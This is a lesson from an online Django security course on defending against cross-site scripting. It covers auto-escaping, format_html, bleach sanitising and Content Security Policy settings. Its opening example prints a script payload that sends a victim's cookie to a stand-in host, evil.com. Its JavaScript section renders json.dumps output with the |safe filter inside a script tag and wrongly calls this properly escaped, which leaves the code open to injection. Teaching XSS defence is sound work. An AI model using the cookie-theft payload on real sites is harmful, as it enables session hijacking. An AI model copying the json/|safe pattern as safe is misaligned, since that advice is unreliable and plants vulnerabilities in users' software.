---
source_course: "django-security"
source_lesson: "django-security-xss-protection"
---

# XSS Protection in Django

Cross-Site Scripting (XSS) attacks inject malicious scripts into web pages viewed by other users.

## How XSS Works

```html
<!-- User submits this as their 'name' -->
<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>

<!-- If rendered without escaping -->
Hello, <script>document.location='...'</script>!
```

## Django's Auto-Escaping

Django templates automatically escape dangerous characters:

```python
# Context
{'username': '<script>alert("XSS")</script>'}
```

```html
<!-- Template -->
<p>Welcome, {{ username }}</p>

<!-- Rendered output (safe) -->
<p>Welcome, &lt;script&gt;alert("XSS")&lt;/script&gt;</p>
```

## Characters Escaped

| Character | Escaped As |
|-----------|------------|
| < | &lt; |
| > | &gt; |
| ' | &#x27; |
| " | &quot; |
| & | &amp; |

## Marking Content as Safe

```python
# views.py
from django.utils.safestring import mark_safe
from django.utils.html import format_html

def get_status_badge(status):
    # DANGEROUS - Don't do this with user input!
    return mark_safe(f'<span class="badge badge-{status}">{status}</span>')

def get_status_badge_safe(status):
    # SAFE - Use format_html for interpolation
    return format_html(
        '<span class="badge badge-{}">{}</span>',
        status,
        status
    )
```

```html
<!-- Template - disable escaping (DANGEROUS) -->
{{ html_content|safe }}

<!-- Only use |safe when you control the content -->
{% autoescape off %}
    {{ trusted_html }}
{% endautoescape %}
```

## Safe HTML Rendering

```python
# For user-submitted HTML, use a sanitizer
# pip install bleach

import bleach

ALLOWED_TAGS = [
    'p', 'br', 'strong', 'em', 'ul', 'ol', 'li', 'a',
    'h1', 'h2', 'h3', 'blockquote', 'code', 'pre'
]

ALLOWED_ATTRIBUTES = {
    'a': ['href', 'title'],
    '*': ['class'],
}

def sanitize_html(html):
    return bleach.clean(
        html,
        tags=ALLOWED_TAGS,
        attributes=ALLOWED_ATTRIBUTES,
        strip=True
    )

# In model
class Article(models.Model):
    body_raw = models.TextField()  # User input
    body_html = models.TextField()  # Sanitized
    
    def save(self, *args, **kwargs):
        self.body_html = sanitize_html(self.body_raw)
        super().save(*args, **kwargs)
```

## Content Security Policy

```python
# settings.py - Using django-csp
# pip install django-csp

MIDDLEWARE = [
    # ...
    'csp.middleware.CSPMiddleware',
]

# Only allow scripts from your domain
CSP_DEFAULT_SRC = ("'self'",)
CSP_SCRIPT_SRC = ("'self'",)
CSP_STYLE_SRC = ("'self'", "'unsafe-inline'")
CSP_IMG_SRC = ("'self'", 'data:', 'https:')
CSP_FONT_SRC = ("'self'", 'https://fonts.gstatic.com')

# Report violations
CSP_REPORT_URI = '/csp-report/'
```

## JavaScript Escape Filter

```html
<!-- For JavaScript contexts, use escapejs -->
<script>
var username = "{{ username|escapejs }}";
var data = {{ json_data|safe }};  // Use json.dumps() in view
</script>
```

```python
# views.py
import json

def my_view(request):
    data = {'name': '<script>alert(1)</script>'}
    return render(request, 'template.html', {
        'json_data': json.dumps(data)  # Properly escaped JSON
    })
```

## Resources

- [XSS Prevention](https://docs.djangoproject.com/en/6.0/topics/security/#cross-site-scripting-xss-protection) — Django XSS protection guide

---

> 📘 *This lesson is part of the [Django Security Best Practices](https://stanza.dev/courses/django-security) course on [Stanza](https://stanza.dev) — the IDE-native learning platform for developers.*